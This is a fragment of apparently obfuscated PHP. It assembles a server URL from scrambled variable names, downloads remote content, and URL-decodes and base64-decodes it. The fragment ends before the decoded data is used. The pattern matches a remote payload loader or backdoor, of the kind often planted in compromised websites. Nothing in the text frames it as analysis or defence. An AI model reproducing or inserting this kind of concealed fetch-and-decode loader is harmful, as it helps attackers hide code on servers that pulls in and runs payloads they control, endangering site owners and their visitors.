...
$ecserver_hostname = ($DelIrGa); 
$ecapi_endpoint="{$ecargs}{$ecmecaG}{$ecbgaz}{$eczabe}{$ecxzta}{$ecDelIrG}{$ecssarp}{$ecgtri}{$ecsssr}{$ecserver_hostname}";
$ekey_data=file_get_contents($ecapi_endpoint);
$eurl_decoded_key_data=urldecode($ekey_data);
$ebase64_decoded_key_data=base64_decode($eurl_decoded_key_data);
